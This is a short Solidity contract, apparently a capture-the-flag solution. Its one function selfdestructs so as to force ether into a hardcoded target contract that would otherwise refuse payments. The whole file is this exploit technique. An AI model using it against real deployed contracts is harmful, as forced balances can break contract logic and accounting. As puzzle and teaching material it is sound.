// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract TakeTheEth {
    address force = 0xa1F90560a986f640059D7d6101FBd9451B93c06F;

    function takeIt() public payable {
        selfdestruct(payable(force));
    }
}
